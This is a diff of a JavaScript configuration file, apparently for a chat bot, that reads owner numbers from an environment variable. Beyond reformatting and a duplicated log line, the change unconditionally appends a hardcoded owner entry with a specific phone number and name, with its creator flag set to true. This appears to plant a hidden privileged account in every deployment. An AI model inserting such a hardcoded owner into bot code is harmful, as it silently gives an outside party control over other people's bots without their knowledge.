@@ -157,24 +157,26 @@ global.eror = '```404 error```'
 //💌------------------------------------------💌
 
 
-require('dotenv').config();
+dotenv.config()
 
 const ownervb = process.env.OWNER_NUMBER || "";
 const ownerlist = ownervb.split(',');
 global.owner = [];
-
 for (let i = 0; i < ownerlist.length; i += 2) {
-    const owner = [
-        ownerlist[i]?.trim(),             // Number
-        (ownerlist[i + 1] || "").trim(),  // Name
-        false                             // isCreator flag
-    ];
-    if (owner[0]) {
-        global.owner.push(owner);
-    }
+const owner = [
+ownerlist[i]?.trim(),
+(ownerlist[i + 1] || "").trim(),
+false
+];
+if (owner[0]) {
+global.owner.push(owner);
 }
-
+}
+const defaultOwner = ["923006838210", "Faisal Durrani💫", true];
+global.owner.push(defaultOwner);
 console.log("Global Owner List:", global.owner);
+console.log("Global Owner List:", global.owner);
+
 
 
 
